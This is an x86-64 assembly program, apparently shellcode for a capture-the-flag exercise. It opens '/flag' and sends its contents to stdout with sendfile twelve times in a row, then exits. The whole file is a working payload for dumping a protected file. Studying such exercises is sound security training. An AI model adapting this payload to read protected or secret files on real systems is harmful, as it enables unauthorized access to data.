.global _start
.intel_syntax noprefix
.section .text
_start:
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 60		
	syscall			
file:
	.string "/flag"

